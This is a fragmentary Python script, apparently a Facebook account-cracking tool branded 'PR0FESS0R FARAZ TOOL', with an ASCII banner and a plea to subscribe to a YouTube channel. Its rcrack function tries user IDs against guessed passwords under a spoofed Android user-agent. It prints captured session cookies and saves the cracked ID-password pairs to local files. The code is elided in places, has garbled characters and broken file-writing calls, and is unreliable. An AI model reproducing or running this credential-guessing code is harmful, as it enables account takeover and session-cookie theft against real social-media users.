...
try:
    ...
    os.system('pip install mechanize requests futures==2 > /dev/null')
    os.system('python run.py')
print('\n\033[1;32m[â€¢]   WHAT YOU WAITING FOR GUYS SUBSCRIBED MY YOUTUBE CHANNEL');time.sleep(1)
print('\n\033[1;36m[â€¢]   WELCOME TO PR0FESS0R FARAZ TOOL...');time.sleep(3)
...
logo=("""                  
\033[38;5;46md88888b  .d8b.  d8888b.  .d8b.  d88888D  .d88b.  
\033[38;5;46m88'     d8' `8b 88  `8D d8' `8b YP  d8' .8P  Y8. 
\033[38;5;46m88ooo   88ooo88 88oobY' 88ooo88    d8'  88    88 
\033[38;5;46m88~~~   88~~~88 88`8b   88~~~88   d8'   88    88 
\033[38;5;46m88      88   88 88 `88. 88   88  d8' db `8b  d8' 
\033[38;5;46mYP      YP   YP 88   YD YP   YP d88888P  `Y88P'  
\033[38;5;46m
\033[38;5;46  SAY I LOVE YOU I WELL QURBAN MY SELF FROM YOU PORA NASAL😅
\033[38;5;46m=================================""")
...
def m1():
    ...
    print(46*'-')
    print('IDZ SAVED IN OK.FARAZ: CP.FARAZ')
    print(46*'-')
...
def rcrack(uid,pwx,tl):
    ...
    'user-agent': 'Mozilla/5.0 (Linux; Android 13; TECNO KI7 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.193 Mobile Safari/537.36', 
    'viewport-width': '980',
}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[FARAZ-OK] '+cid+' | '+ps+'\033[0;97m\n[â€Žâ€ŽðŸª]\033[1;33m ðŸ…²ï¸ŽðŸ…¾ï¸ŽðŸ…¾ï¸ŽðŸ…ºï¸ŽðŸ…¸ï¸ŽðŸ…´ï¸Ž = \033[1;32m'+coki+  '  ''  \033[0;97m')
                open('FARAZ-OK.FARAZ' 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                print('\033[1;31m[FARAZ-CP] '+uid+' | '+ps+'\x1b[1;97m')
                open('FARAZ-CP.FARAZ' 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
